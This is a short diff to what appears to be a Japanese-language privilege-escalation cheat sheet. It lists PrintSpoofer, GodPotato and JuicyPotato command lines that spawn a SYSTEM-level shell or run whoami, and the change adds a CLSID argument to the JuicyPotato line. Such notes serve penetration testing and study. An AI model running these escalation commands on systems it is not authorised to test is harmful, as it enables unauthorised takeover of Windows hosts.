@@ -32,7 +32,7 @@ PrintSpoofer.exe -i -c cmd
 GodPotato-NET4.exe -cmd "cmd /c whoami"
 
 :: JuicyPotato（古い環境向け。CLSID 指定が要る）
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {<CLSID>}
 ```
 
 ## 注意点
